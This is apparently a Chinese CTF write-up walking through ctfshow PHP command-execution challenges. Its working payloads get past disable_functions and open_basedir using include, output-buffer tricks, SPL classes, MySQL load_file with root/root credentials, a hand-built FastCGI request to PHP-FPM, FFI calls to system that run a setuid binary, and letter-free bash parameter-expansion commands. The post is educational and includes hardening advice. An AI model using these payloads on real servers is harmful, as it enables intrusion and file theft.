出 flag。

#### 为什么能绕

- `scandir`、`implode`、`echo` 都没被禁
- `highlight_file` 也没被禁（这题只禁了 `print_r`、`var_dump` 这类"打印"函数，读文件的本体还在）





### web68

![image-20261108100752030](/assets/ctfshow-web-command-exec/image-20261108100752030.png)

**比 web67 只多禁了一个 `highlight_file`**

禁用表去重 79 项，和 web69 几乎一样（web69 是 85 项）。首页直接报：

```
Warning: highlight_file() has been disabled for security reasons
```

源码显示不出来了，但 `eval($c)` 还在。

#### 解法：include 语言构造

```
c=include('/flag.txt');
```

出 flag。

需要确认文件名的话，`scandir` 没被禁：

```
c=echo implode(' ',scandir('/'));
```



### web69

![image-20261108094911427](/assets/ctfshow-web-command-exec/image-20261108094911427.png)

**连 `highlight_file` 都禁了**

相比 web66，新增：

```
chr,echo,fgetcsv,fscanf,ftruncate,highlight_file,
move_uploaded_file,print,print_r,pwn,readline,str_repeat,var_dump
```

（去重后 85 项）

首页直接报：

```
Warning: highlight_file() has been disabled for security reasons
```

也就是说，出题人终于把"自己要用的函数"也禁了——页面因此**显示不了源码**，但 `eval($c)` 还在，POST 传 c 照样执行。

#### 最后一招：`include` 禁不掉

`include`/`require` 是**语言构造**，写进 `disable_functions` 完全没有效果（web66 已经验证过）。

而 `include` 一个**非 PHP 文件**时，会把它**原样输出**：

```
c=include('/flag.txt');
```

直接出 flag。

#### 注意一个很有意思的现象

`echo`、`print` 明明写在 `disable_functions` 里，但 `c=echo ini_get('disable_functions');` 照样有输出——再次证明**语言构造无法被 disable_functions 禁用**。同理 `include`、`require`、`isset`、`empty` 这些也都是。

#### 一句话

黑名单连 `highlight_file` 都封了，但**语言构造封不掉**。所以读文件的"最终保底"就是：

```
c=include('/flag.txt');
```

### web70

![image-20261108100808535](/assets/ctfshow-web-command-exec/image-20261108100808535.png)

**警告刷屏，但 include 依然可用**

web70 的源码比前面多两行：

```php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
?>
你要上天吗？
```

而 `error_reporting`、`ini_set` 都在 `disable_functions` 里，于是页面顶部先刷两条警告（想关报错但关不掉），然后才执行我们的代码：

```
Warning: error_reporting() has been disabled for security reasons ... line 14
Warning: ini_set() has been disabled for security reasons ... line 15
Warning: highlight_file() has been disabled for security reasons ... line 21
你要上天吗？
```

禁用表去重 85 项，比 web68 多：`echo`、`print`、`var_dump`、`ftruncate`、`move_uploaded_file`、`readline`、`xml_parse`。

#### 解法还是 include

```
c=include('/flag.txt');
```

出 flag。

#### 小技巧

输出被警告糊住时，直接 `grep ctfshow` 从响应里捞；想确认源码结构，可以用 `SplFileObject` 读 `index.php`：

```
c=$f=new SplFileObject('index.php');foreach($f as $l){echo $l;}
```





### web71

**输出里的字母和数字会被替换成 `?`**

源码（附件 `index.php`）：

```php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
?>
你要上天吗？
```

关键在最后三行：eval 执行完后，把**输出缓冲区**的内容取出来，用 `preg_replace` 把所有**字母和数字**替换成 `?`，再输出。

所以正常读文件，flag 会变成：

```
???????{???????????????}
```

#### 绕过：先关掉输出缓冲

`ob_get_contents()` 只能拿到**当前缓冲区**里的内容。如果在 eval 里先执行 `ob_end_flush()` 把缓冲关掉，之后的输出会**直接发给客户端**，不再经过 `preg_replace`。

```
c=ob_end_flush();include('/flag.txt');
```

执行过程：

1. `ob_end_flush()`：关闭当前输出缓冲，并把它刷出去（此时是空的）
2. `include('/flag.txt')`：文件内容直接写进响应
3. eval 结束后，脚本再调 `ob_get_contents()` 已经拿不到缓冲区，`preg_replace` 处理空内容，不影响我们

#### 实测对照

- `c=include('/flag.txt');` → flag 里的字母数字全变成 `?`
- `c=ob_end_flush();include('/flag.txt');` → **直接出 flag**

#### 顺便列目录也可以

```
c=ob_end_flush();echo implode(' ',scandir('/'));
```

> 页面顶部那两条 `error_reporting()/ini_set() has been disabled` 警告不用管，是 web70 那一批 disable_functions 的遗留，不影响 payload 执行。


### web73

**去掉了 open_basedir，但读文件的函数还是全禁**

源码还是 eval + 输出过滤（同 web71/72），`disable_functions` 也还是一大串：`file_get_contents`、`readfile`、`file`、`fopen`、`highlight_file`、`show_source` 全在里面。

但这题**没有设置 `open_basedir`**（`ini_get('open_basedir')` 为空），所以可以读根目录。

#### 先找 flag 文件

```
c=ob_end_flush();echo implode('|',scandir('/'));
```

根目录里能看到 `flagc.txt`（注意不是 `flag.txt`，文件名每个实例可能不同，先列目录最稳）。

#### 读它

`include` 是语言构造，`disable_functions` 禁不掉；再配合 `ob_end_flush()` 绕过输出过滤：

```
c=ob_end_flush();include('/flagc.txt');
```

直接出 flag。

#### 对照

- `c=include('/flagc.txt');` → 字母数字被替换成 `?`，看不到 flag
- `c=ob_end_flush();include('/flagc.txt');` → 直接出 flag

#### 为什么值得学

这题把前面几个点组合起来，没有 pwn，全是 web 思路：

- 输出过滤 → `ob_end_flush()` 关缓冲
- 读文件函数被禁 → 用 `include`（语言构造）
- 文件名不确定 → `scandir('/')` 先列目录
- 没有 `open_basedir` 才读得到根目录（web72 有，所以 web72 才要上 UAF）

### web74

**同一套代码，但黑名单更狠：连 `scandir`、`var_dump` 都禁了**

源码和 web73 一字不差，还是 `eval($c)` + `preg_replace` 打码。变的是 `disable_functions`：除了原来那批读文件函数，`scandir`、`var_dump`、`print_r`、`phpinfo`、`system/exec/shell_exec/passthru` 全被加进去了。

`ini_get` 没被禁，可以直接把黑名单打印出来看：

```
c=ob_end_flush();printf('OB=[%s]|DF=[%s]',ini_get('open_basedir'),ini_get('disable_functions'));
```

结果 `open_basedir` 为空（不限制目录），黑名单里有意思的是这一串：

```
scandir,...,echo,var_dump,print,fopen,...,highlight_file,print_r,...,include,include_once,require,require_once,...,phpinfo,...,system,...
```

**`echo`、`print`、`include`、`include_once`、`require`、`require_once` 都被写进了黑名单——然而它们全是语言构造（language construct），不是函数，`disable_functions` 根本管不到，照样能用。** 这就是本题的核心考点。

#### 第一步：找 flag 文件（`scandir` 被禁）

至少三条路，都实测可用：

**方法一：`glob()` 没被禁**

```
c=ob_end_flush();echo implode('|',glob('/*'));
```

得到 `/flagx.txt`（文件名又和上一题不一样，所以"先列目录"这一步不能省）。

**方法二：`opendir()` / `readdir()` 没被禁**

```
c=ob_end_flush();$d=opendir('/');while(($f=readdir($d))!==false){echo $f.'|';}
```

**方法三：SPL 类（类不受函数黑名单管）**

```
c=ob_end_flush();foreach(new DirectoryIterator('/') as $f){echo $f->getFilename().'|';}
```

`DirectoryIterator` 是 PHP 内置的 SPL 类，`disable_functions` 只能禁"函数名"，禁不了 `new 类()` 和类的方法。

#### 第二步：读文件

`include` 是语言构造，黑名单里写了也拦不住；再配 `ob_end_flush()` 绕过输出过滤：

```
c=ob_end_flush();include('/flagx.txt');
```

直接出 flag。

备用方案是用 SPL 的 `SplFileObject`——`fopen`/`fgets`/`file_get_contents` 全禁了也没关系，因为这里调的是类方法：

```
c=ob_end_flush();$o=new SplFileObject('/flagx.txt');foreach($o as $l){echo $l;}
```

#### 对照

- `c=include('/flagx.txt');` → flag 被打码成 `???????{...}`
- `c=ob_end_flush();include('/flagx.txt');` → 直接出 flag

#### 为什么值得学

`disable_functions` 本质是一张"函数名"黑名单，有三类东西它管不住：

1. **语言构造**：`echo` / `print` / `include` / `require`——写进黑名单等于没写
2. **没被列出的函数**：`glob` / `opendir` / `printf` / `ini_get`——黑名单靠穷举，漏一个就够用
3. **类和类方法**：`DirectoryIterator` / `SplFileObject`——禁函数管不到面向对象接口

企业加固视角：只靠 `disable_functions` 必然漏，必须叠加 `open_basedir`、Web 进程最小权限、容器/沙箱隔离，并把上传目录设为不可执行。这题把"黑名单的边界在哪"演示得非常清楚，建议记住这三类绕过。

### web75

![image-20261108124648010](/assets/ctfshow-web-command-exec/image-20261108124648010.png)

**open_basedir 回来了：PHP 层的读取全部封死，最后靠 MySQL 的 `load_file()` 破局**

源码还是那一套（`eval($c)` + `preg_replace` 打码），`disable_functions` 和 web74 同样 95 项。真正的变化是 `ini_get('open_basedir')`：

```
/var/www/html/
```

也就是说，PHP 脚本能碰的文件只剩站点目录。而 `/var/www/html` 里只有两个文件：

- `index.php`（题目本体）
- `flag.php` —— **假旗**，内容是 `$flag="秀秀得了,这次不在这里";`

`getenv()` 里还有一个名为 `not_flag` 的环境变量，同样是诱饵。真 flag 在根目录：`/flag36.txt`（用 `DirectoryIterator('glob:///*')` 能看见名字）。

#### 一、先把"不行的路"全部走一遍（这张表就是本题的价值）

| 尝试 | 结果 |
|---|---|
| `include('/flag36.txt')` | `open_basedir restriction in effect` |
| `new SplFileObject('/flag36.txt')` | `open_basedir restriction` |
| `glob('/*')` | 只匹配到字面量 `/`，通配符不生效 |
| `opendir('/')` / `readdir()` | `open_basedir restriction` |
| `gzfile()` / `php_strip_whitespace()` / `stat()` / `md5_file()` / `getimagesize()` | 全部被拦 |
| `php://filter/resource=/flag36.txt` | 被拦 |
| `/proc/self/root/flag36.txt` | 被拦 |
| `/var/www/html/../../flag36.txt` | 被拦（按真实路径归一化后比较） |
| `chdir('/')` 之后用相对路径 | 被拦 |
| XXE：`DOMDocument` + `<!ENTITY f SYSTEM "file:///flag36.txt">` | 失败，报 `Entity 'f' not defined` |
| `new SQLite3('/flag36.txt')` | `open_basedir prohibits opening` |
| `PharData` / `XMLReader` / `finfo_file` | 全部失败 |

三个值得记住的细节：

- **XXE 为什么也不行**：PHP 的 libxml 扩展把外部实体加载器接到了 PHP 的流上（`_php_libxml_external_entity_loader`），所以读文件时照样过 open_basedir 检查。连允许目录内的 `flag.php` 都报 `undefined entity`，说明实体根本没被加载。
- **`glob('/*')` 返回 1**：那个 1 是字面量 `/` 自身，不是目录内容。带通配符的 glob 同样受 open_basedir 约束。
- **黑名单里为什么有一堆 `strlen`/`chr`/`ord`/`bin2hex`/`dechex`**：它们不是用来防"读文件"的，而是专门用来废掉 web72 的 UAF PoC（`php7-gc-bypass` 靠这些函数做指针运算、拼 payload、算偏移）。这题里 `strlen` 一挂，UAF 脚本连 `system` 的地址都算不出来，作者是照着 PoC 逐个封的。

#### 二、唯一活着的口子：`glob://` 能列目录

```
c=ob_end_flush();foreach(new DirectoryIterator('glob:///*') as $f){echo $f->getFilename().'|';}
```

输出：

```
bin|dev|etc|flag36.txt|home|lib|media|mnt|opt|proc|root|run|sbin|srv|sys|tmp|usr|var|
```

`glob://` 包装器不受 open_basedir 限制，所以能拿到名字。但注意：**它只能列名字**——拿到的 `SplFileInfo` 再调 `openFile()` 读内容时，open_basedir 检查又回来了（实测 `File(//flag36.txt) is not within the allowed path(s)`）。所以别指望 `glob://` 直接读出内容。

#### 三、正解：MySQL 的 `load_file()`（数据库代读）

思路一句话：**PHP 被 open_basedir 关在 `/var/www/html`，但 MySQL 服务端没被关。** 只要能让 MySQL 帮我们读文件，PHP 的限制就形同虚设。

为什么可行（实测环境）：

- PHP 以 `www-data` 低权限运行，读文件受 open_basedir 约束；而 `mysqld` 以 **root** 运行，`load_file()` 用的是 MySQL 进程的权限，完全不经过 PHP 的 open_basedir 检查
- 数据库是弱口令 `root/root`，且 `select @@secure_file_priv` 返回**空**（不为空时只能读指定目录），root 又自带 `FILE` 权限，所以能读任意路径

先确认能不能连上、顺便看看有哪些库：

```
c=ob_end_flush();
$l=mysqli_connect('127.0.0.1','root','root');
$r=mysqli_query($l,'SHOW DATABASES');
while($x=mysqli_fetch_assoc($r)){ echo $x['Database'].'|'; }
```

回显：

```
ctftraining|information_schema|mysql|performance_schema|test|
```

然后直接读文件（mysqli 版）：

```
c=ob_end_flush();
$l=mysqli_connect('127.0.0.1','root','root');
$r=mysqli_query($l,'select load_file("/flag36.txt") as a');
while($x=mysqli_fetch_assoc($r)){ echo $x['a']; }
exit();
```

PDO 版（更短，wp 里用的就是这种）：

```
c=ob_end_flush();
$d=new PDO('mysql:host=127.0.0.1','root','root');
foreach($d->query('select load_file("/flag36.txt")') as $r){ echo $r[0]; }
exit();
```

两个版本实测都能直接出 flag。

##### 关于 `dbname`：为什么可以不写

网上很多 wp 写的是 `new PDO('mysql:host=localhost;dbname=ctftraining','root','root')`，于是会让人误以为必须先知道库名。其实：

- `dbname` 只决定连接后"默认选中哪个库"，**`load_file()` 是 MySQL 的服务端函数，跟当前库没有关系**
- 认证只看 host / user / password，`mysqli_connect()` 的第四个参数（库名）本来就是可选的；不写就是"已连接、但未选库"的状态
- 所以 `dbname` 写 `ctftraining`、写 `mysql`、或者干脆省略，效果完全一样。我实测 `('mysql:host=127.0.0.1','root','root')` 照样出 flag

##### 为什么每条 payload 末尾都要 `exit()`

题目在 `eval($c)` 之后还有一段 `$s=ob_get_contents(); ob_end_clean(); echo preg_replace(...)` 的打码逻辑。`exit()`/`die()` 直接终止脚本，后面的过滤代码根本不执行——等于"物理绕过"。当然我们用 `ob_end_flush()` 已经绕过打码了，`exit()` 是双保险，也能顺手省掉尾部多余输出。

（wp 里 payload 前面的 `c=?><?php` 是多余的：`eval()` 里本来就是 PHP 代码，不需要再开标签，直接写语句即可。）

#### 四、进阶选读：PHP-FPM 的 FastCGI 协议（换执行层）

除了"让 MySQL 代读"，还有一条更底层的路，也实测成功：**用 FastCGI 协议让 PHP-FPM 在新的 ini 配置下重新执行脚本**。这条路的现实意义更大（SSRF 打内网 FastCGI、php-fpm 9000 裸奔都是这个原理），所以留作进阶。

先看两个条件：

1. 环境是 php-fpm（`getenv()` 里能看到 `--enable-fpm`、`HOME=/home/www-data`），`127.0.0.1:9000` 是它的监听端口；
2. `fsockopen` 被禁了，**但 `stream_socket_client` 没被禁**，`stream_socket_client('tcp://127.0.0.1:9000')` 实测能连上。

原理：php-fpm 用 FastCGI 协议和 Web 服务器通信，请求里的 `PHP_VALUE` / `PHP_ADMIN_VALUE` 参数会在**脚本执行之前**修改 php.ini 设置。于是我们自己构造一个 FastCGI 请求发给 FPM，让它执行 `index.php`，同时把 `open_basedir` 改成 `/`，再在 POST 的 `c` 里放 `include('/flag36.txt')`——这时候 open_basedir 已经是根目录，文件就读出来了。

payload（省掉了注释和调试输出）：

```php
ob_end_flush();
// FastCGI 记录：8 字节头 + 内容 + 按 8 字节对齐的填充
function rc($type,$content){
    $l=mb_strlen($content,'8bit');
    $pad=(8-$l%8)%8;
    return pack('CCnnCC',1,$type,1,$l,$pad,0).$content.str_repeat("\0",$pad);
}
// name-value pair：长度 <128 用 1 字节，否则 4 字节大端且最高位置 1
function nv($n,$v){
    $e=function($l){return $l<128?pack('C',$l):pack('N',$l|0x80000000);};
    return $e(mb_strlen($n,'8bit')).$e(mb_strlen($v,'8bit')).$n.$v;
}

$body='c='.urlencode("ob_end_flush();include('/flag36.txt');");

$params = nv('SCRIPT_FILENAME','/var/www/html/index.php')
        . nv('REQUEST_METHOD','POST')
        . nv('CONTENT_TYPE','application/x-www-form-urlencoded')
        . nv('CONTENT_LENGTH',''.mb_strlen($body,'8bit'))
        . nv('PHP_VALUE','open_basedir=/');

$req = rc(1,pack('nC',1,0).str_repeat("\0",5))   // BEGIN_REQUEST：role=1(响应者)+flags+5字节保留
     . rc(4,$params).rc(4,'')                     // PARAMS，空记录结尾
     . rc(5,$body).rc(5,'');                      // STDIN，空记录结尾

$s=stream_socket_client('tcp://127.0.0.1:9000',$en,$es,5);
stream_set_timeout($s,5);
stream_socket_sendto($s,$req);
$resp=stream_get_contents($s);
preg_match('/ctfshow\{[^}]*\}/',$resp,$m);
echo $m[0];
```

几个协议细节：

- 记录头固定 8 字节：版本(1) + 类型(1) + requestId(2) + 内容长度(2) + 填充长度(1) + 保留(1)，对应 `pack('CCnnCC',...)`
- 类型：`1`=BEGIN_REQUEST、`4`=PARAMS、`5`=STDIN
- BEGIN_REQUEST 的内容固定 8 字节：role(2) + flags(1) + 5 字节保留，role=1 表示"响应者"
- PARAMS 和 STDIN 都以一条**空记录**结束
- 读响应不用 `fread`（被禁），用 `stream_get_contents` 一次读完

实测 `PHP_VALUE` 单独就能改 `open_basedir`（它是 `PHP_INI_ALL` 级别），换成 `PHP_ADMIN_VALUE` 也可以。

#### 五、这条路的两个坑

**1. `disable_functions` 清不掉**

有的人会想在 `PHP_ADMIN_VALUE` 里写 `disable_functions=`，让 `system()` 复活。实测**不行**：`system()` 仍然报 `has been disabled`。原因是"禁用函数表"在 PHP 启动（module init）阶段就已经注册好了，请求阶段再改 ini 不会重新启用函数。所以别绕远路，直接用 `include`（语言构造，黑名单禁不掉）读文件。

**2. 改过的 ini 会残留在 FPM worker 里**

实测发完 `open_basedir=/` 的 FastCGI 请求后，**后续普通请求**的 `ini_get('open_basedir')` 也变成了 `/`，也就是这个 worker 被"污染"了。做题时这会让后面的对照实验失真（我一开始就被骗了一次：以为 `SplFileObject` 和 `glob` 突然能用了，其实是 open_basedir 已经被改成 `/`）。要恢复就再发一个 `open_basedir=/var/www/html/` 的 FastCGI 请求。

#### 六、为什么值得学

1. **"数据库代读"是经典思路**：只要目标机上有高权限服务（MySQL/Redis 等）能被低权限的 Web 进程调用，open_basedir、disable_functions 这类"进程内限制"就绕过去了。`load_file()` 是其中最常用的一招。
2. **弱口令 + `secure_file_priv` 为空的杀伤力**：这两件事单独看都"不算漏洞"，凑在一起就是任意文件读取（配合 `INTO OUTFILE` 还能写 webshell）。
3. **真实世界的高危配置**：php-fpm 监听 9000 且容器内/内网可达 → 可以任意覆盖 PHP 配置、执行任意脚本，等价于 RCE。SSRF 打内网 FastCGI（Gopherus 那类工具）用的是同一套协议。
4. **看清边界的层次**：`open_basedir` + `disable_functions` 只是 PHP 解释器层的约束；往外一层有 MySQL 的权限，再往外有 FPM 的配置覆盖。哪一层没锁死，整条链就断了。
5. **防守视角**：MySQL 用最小权限账户、限制 `FILE` 权限、设置 `secure_file_priv`、数据库只监听本地且强口令；FPM 只监听 unix socket、设置 `listen.allowed_clients`、`security.limit_extensions`、容器网络隔离。

#### 对照小结

- PHP 层能想到的读法（include / SPL / 伪协议 / XXE / SQLite / Phar）在这题全被封死
- `glob://` 只能列目录，不能读内容
- web72 的 UAF 脚本也被 `strlen` 等函数封死
- 真正破局的是**换一层**：最省事的是让 MySQL（root 权限）用 `load_file()` 代读；更底层的是用 FastCGI 协议让 FPM 重载 ini

### web76

![image-20261108162439941](/assets/ctfshow-web-command-exec/image-20261108162439941.png)

**同一题换文件名：`/flag36d.txt`（复用题，没有新知识点）**

环境与 web75 一致：`open_basedir=/var/www/html/`，`disable_functions` 100 项。对比之后只有两处变化：

1. 黑名单多了 `file_exists` / `is_dir` / `is_file`——封的是"文件存在性探测"，对 MySQL 代读没有任何影响；
2. flag 文件名从 `flag36.txt` 变成 `flag36d.txt`。

所以这题唯一要改的就是文件名，其余照抄：

```
c=ob_end_flush();$d=new PDO('mysql:host=127.0.0.1','root','root');foreach($d->query('select load_file("/flag36d.txt")') as $r){echo $r[0];}exit();
```

直接出 flag。

**小结**：web76 是 web75 的复用题。真正值得记住的是那个固定套路——**每关文件名都会变，先用 `DirectoryIterator('glob:///*')` 列目录确认文件名，再让 MySQL `load_file()` 代读**，不要拿上一题的路径硬套。

### web77

![image-20261108185616004](/assets/ctfshow-web-command-exec/image-20261108185616004.png)

**FFI：直接调用 C 函数，`disable_functions` 彻底失效**

环境：`PHP 7.4.9`、`open_basedir=/var/www/html/`、**`ffi.enable=1`**、`disable_functions` 94 项。但 `FFI` 这个类既不在黑名单里，也不是黑名单能管住的东西。

#### 一、先看根目录：flag 和 readflag

```
c=ob_end_flush();foreach(new DirectoryIterator('glob:///*') as $f){echo $f->getFilename().'|';}exit();
```

```
bin|boot|dev|etc|flag36x.txt|home|lib|lib64|media|mnt|opt|proc|readflag|root|run|sbin|srv|sys|tmp|usr|var|
```

根目录里除了 `flag36x.txt`，还有一个 `readflag` 可执行文件。

#### 二、为什么不能直接读：是权限问题，不是 open_basedir

用 FFI 调 `ls -l` 看一眼：

```
c=ob_end_flush();$f=FFI::cdef('int system(const char *command);');$f->system('ls -l /flag36x.txt /readflag > /var/www/html/out.txt 2>&1');exit();
```

再读 `out.txt`：

```
c=ob_end_flush();readgzfile('out.txt');exit();
```

结果：

```
-r--r----- 1 root root   46 Nov  8 10:54 /flag36x.txt
-r-sr-xr-x 1 root root 8392 Sep 16  2020 /readflag
```

- Web 进程是 `uid=33(www-data)`，而 `flag36x.txt` 是 `440 root:root`——只有 root（和 root 组）能读，**www-data 连读权限都没有**
- `/readflag` 的权限位里有 **`s`**（`-r-sr-xr-x`）= **setuid root**：不管谁执行它，进程都以 root 身份运行

所以思路是：**让 `/readflag` 以 root 身份把 flag 读出来，再把结果搬到我们能读的地方**。

#### 三、FFI 调 system

FFI（Foreign Function Interface，外部函数接口）是 PHP 7.4 引入的扩展：它能声明并直接调用 C 函数、加载共享库。调用链不经过 PHP 的函数表，所以 `disable_functions` 对它完全无效。

```
c=ob_end_flush();$f=FFI::cdef('int system(const char *command);');$f->system('/readflag > /var/www/html/1.txt');exit();
```

- `FFI::cdef('int system(const char *command);')`：声明 libc 里 `system` 的原型
- `$f->system(...)`：直接调用 libc 的 `system`，等价于在 C 里执行命令
- 把 `/readflag` 的输出重定向到站点目录（`open_basedir` 允许的 `/var/www/html/1.txt`）

然后读出来：

```
c=ob_end_flush();readgzfile('1.txt');exit();
```

直接出 flag。

`readgzfile` 能读普通文本（zlib 对非压缩数据透明处理），换成 `include('1.txt')` 也一样。

#### 四、几个实测细节

- `include('/flag36x.txt')` 直接被 `open_basedir restriction` 拦掉
- 这题容器里没有 `pdo_mysql`（报 `could not find driver`），所以 web75 那条"MySQL 代读"的路走不通
- 实测直接 `$f->system('/readflag')` 拿不到回显（返回码 0，但页面没有输出），所以必须先重定向到文件再读——这也是 wp 里要写 `> 1.txt` 的原因

#### 五、为什么值得学

1. **FFI 是对 `disable_functions` 的"降维打击"**：黑名单拦的是 PHP 函数名，FFI 直接调 libc，`system` / `open` / `read` / `execve` 全都能用。同类绕过还有 LD_PRELOAD、PHP-FPM、UAF，但 FFI 是最省事的一个。
2. **SUID 提权是经典组合**：Web 进程低权限 + 机器上有 SUID root 的辅助程序（`readflag`），执行它就等于借到了 root 的文件读取能力。现实中的 SUID 程序、`sudo` 配置、计划任务都是同一类"借权"思路。
3. **防守视角**：`ffi.enable=off`（PHP 默认是 `preload`，Docker 官方镜像常被人改成 `1`）、清理不必要的 SUID 程序、`open_basedir` 只是纵深防御里的一层。

### web118

![image-20261108194050009](/assets/ctfshow-web-command-exec/image-20261108194050009.png)

![image-20261108194112728](/assets/ctfshow-web-command-exec/image-20261108194112728.png)

**过滤掉所有小写字母和数字，用环境变量的"切片"拼出命令**

源码（用下面的 payload 跑 `nl index.php` 读出来的）：

```php
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\'|\"|\`|\||\,/', $code)){
        echo ''.system($code).'';
    }else{
        echo 'evil input';
    }
}
```

过滤清单：

- 所有**小写字母** `[a-z]`、**数字** `[0-9]`
- Tab `\x09`、换行 `\x0a`
- `/` `(` `)` `[` `]` `\` `+` `-` `!` `=` `^` `*` `&` `%` `'` `"` `` ` `` `|` `,`

还能用的：大写字母、`$ { } ? . : ~ < > ; _`，以及**空格**（注意：禁的是 Tab 和换行，普通空格没被禁）。

#### 一、为什么不能直接写 `nl flag.php`

`nl`、`flag` 全是小写字母，`/` 也被禁，直接写一律返回 `evil input`。

#### 二、思路：用环境变量 + 参数展开拼出命令

bash 的 `${VAR:offset:length}` 是**子串切片**，`offset` 位置是一段**算术表达式**。关键点：

- `A` 是个没定义的变量 → 算术值是 `0`
- `~` 在算术里是**按位取反**，不是通配符 → `~A` = `~0` = **-1**
- 负偏移表示从末尾数 → `-1` 就是**最后一个字符**

```
${PATH:~A}   →  PATH 的最后一个字符
${PWD:~A}    →  PWD 的最后一个字符
```

容器里（实测）：

```
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   → 末位 n
PWD=/var/www/html                                                   → 末位 l
```

`n` + `l` = **`nl`**。

再补两块：

| 部分 | 作用 |
|---|---|
| `${IFS}` | shell 的内部字段分隔符（空格/Tab/换行），代替空格（其实空格没被禁，直接写也行） |
| `????.???` | glob 通配：4 字符 + `.` + 3 字符 = `flag.php`，同时字符串里不出现 `flag` |

最终 payload：

```
code=${PATH:~A}${PWD:~A}${IFS}????.???
```

展开成 `nl flag.php`，直接出 flag。

> 网上有些题解把这个 `~A` 解释成"通配符 `*`"或"取第一个路径"，都是错的。`~` 在这里是算术取反，`A` 是未定义变量（=0），结果 `-1` 表示"最后一个字符"。

#### 三、顺手把源码读出来

把文件名换成 5 个字符的名字，就能让 `nl` 去读 `index.php`：

```
code=${PATH:~A}${PWD:~A}${IFS}?????.???
```

输出带行号的源码（本文开头那段就是这么来的）。

#### 四、一个有意思的细节：最后一行会重复

`echo ''.system($code).''` 里，`system()` 会把命令输出直接打到页面，**同时返回输出的最后一行**，再被 `echo` 打印一次。所以 `nl flag.php` 的结果是：

```
     1	<?php
     2	$flag="ctfshow{...}";
     3	?>
     3	?>
```

最后那个 `3	?>` 就是 `system()` 的返回值被 echo 了一遍。

#### 五、为什么值得学 / 局限

- 这是 **bash 参数展开**的经典用法：`${VAR:offset:length}` + 算术表达式，可以在"一个字母数字都不写"的情况下从环境变量里抠出想要的字符。同类技巧还有 `${PATH:0:1}` 取单个字符、`${#VAR}` 取长度。
- **局限**：`${PATH:~A}${PWD:~A}` 能拼出 `nl`，是因为 PATH 恰好以 `n` 结尾、PWD 恰好以 `l` 结尾；换个目录或环境就失效。它属于 CTF 技巧，不是通用手法。
- **防守视角**：`system()` 前挂正则本质是黑名单，永远有漏（大写字母、`$`、`{}`、`?`、`.` 全是漏的）。正确做法是**不把用户输入拼进 shell**（白名单、`escapeshellarg`、或干脆不调 shell），而不是加长黑名单。



### web119

![image-20261108195109815](/assets/ctfshow-web-command-exec/image-20261108195109815.png)

![image-20261108195126674](/assets/ctfshow-web-command-exec/image-20261108195126674.png)

**过滤再加码：`PATH`、`BASH`、`<`、`>` 全封，改用 `PWD` / `SHLVL` 拼命令**

源码（用下面的 payload 读出来的）：

```php
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){
        echo '<div align="center">'.system($code).'</div>';
    }else{
        echo '<div align="center">evil input</div>';
    }
}
```

和 web118 相比，新增封了四个：**`PATH`、`BASH`、`<`、`>`**。其余照旧：Tab、换行、小写字母、数字、`/ ( ) [ ] \ + - ! = ^ * & % ' " \` | ,` 全部禁用。

所以 web118 的 `${PATH:~A}` 直接失效——`PATH` 是禁词，一出现就 `evil input`。

#### 思路：只用 `PWD` + `SHLVL`

可用的"原材料"全是特殊变量：

| 表达式 | 值 | 说明 |
|---|---|---|
| `${#}` | `0` | 位置参数个数（没有参数就是 0） |
| `${##}` | `1` | 上式的**字符串长度**（"0" 长度为 1） |
| `${SHLVL}` | `2` | shell 嵌套深度（第一次开 shell 是 1，再套一层就是 2） |
| `${#SHLVL}` | `1` | "2" 的长度 |

有了 0、1、2 这三个数字，就能做切片：

- `/` = `${PWD:${#}:${##}}` → `PWD[0:1]`
- `a` = `${PWD:${SHLVL}:${#SHLVL}}` → `PWD[2:1]`（`/var/www/html` 第 2 位是 `a`）
- `t` = `${PWD:~${SHLVL}:${#SHLVL}}` → 偏移 `~2` = **-3**，`PWD[-3:1]` = `t`

`~` 还是 web118 那个算术取反：`~2` = -3（不是"倒数第 2 个"）。

最终 payload：

```
code=${PWD:${#}:${##}}???${PWD:${#}:${##}}?${PWD:${SHLVL}:${#SHLVL}}${PWD:~${SHLVL}:${#SHLVL}}${IFS}????.???
```

展开过程：

```
${PWD:${#}:${##}}   → /
???                 → 三个字符的目录名
${PWD:${#}:${##}}   → /
?
${PWD:${SHLVL}:${#SHLVL}}        → a
${PWD:~${SHLVL}:${#SHLVL}}       → t
${IFS}              → 空格
????.???            → flag.php
```

拼出来是：

```
/???/?at flag.php
```

`/???/?at` 这个 glob 在根目录只会匹配到 **`/bin/cat`**（3 个字符的目录里，以 `at` 结尾的文件只有 `cat`），所以最终执行的是：

```
/bin/cat flag.php
```

直接出 flag。

#### 顺手读源码

把文件名换成 5 个字符的 `index.php`：

```
code=${PWD:${#}:${##}}???${PWD:${#}:${##}}?${PWD:${SHLVL}:${#SHLVL}}${PWD:~${SHLVL}:${#SHLVL}}${IFS}?????.???
```

就是本文开头那段源码。

#### 另一个思路：文件上传 + `.`（source）

wp 里也提到了这条路：上传一个内容为 `cat flag.php` 的文件，用 `.`（source）去执行 PHP 生成的临时文件：

```
code=.${IFS}${HOME:${#}:${##}}???${HOME:${#}:${##}}?????M???
```

`${HOME:0:1}` = `/`，整段是 `/???/?????M???` 的 glob，靠反复发包撞 `/tmp/phpXXXXXX` 这个临时文件名。不过实测**上面的参数展开 payload 一次就出**，不用打竞态，所以优先用第一种。

#### 两个细节

- `${PWD:~${SHLVL}:${#SHLVL}}` 里的 `~${SHLVL}` 是 `~2` = -3，取到 `t`；wp 注释写成 `${PWD:-2:1}` 是笔误，`-2` 会取到 `m`，拼不出 `cat`。
